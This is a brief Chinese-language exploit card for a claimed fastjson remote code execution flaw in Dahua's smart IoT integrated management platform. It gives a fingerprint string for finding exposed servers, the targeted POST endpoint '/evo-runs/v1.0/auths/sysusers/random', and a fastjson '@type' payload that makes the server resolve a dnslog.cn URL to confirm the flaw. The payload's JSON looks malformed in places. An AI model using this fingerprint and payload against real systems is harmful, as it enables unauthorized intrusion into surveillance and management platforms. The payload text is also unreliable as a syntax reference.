# 大华智能物联综合管理平台fastjson远程代码执行

大华 ｜ 命令执行 ｜ —
- **指纹**：`body="*客户端会小于800*"`
- **请求**：`POST /evo-runs/v1.0/auths/sysusers/random HTTP/1.1`

**Payload**
```
"a":{
"@type":"com.alibaba.fastjson.JSONObject",
{"@type":"java.net.URL","val":"http://dnslog.cn"}
}""
}
```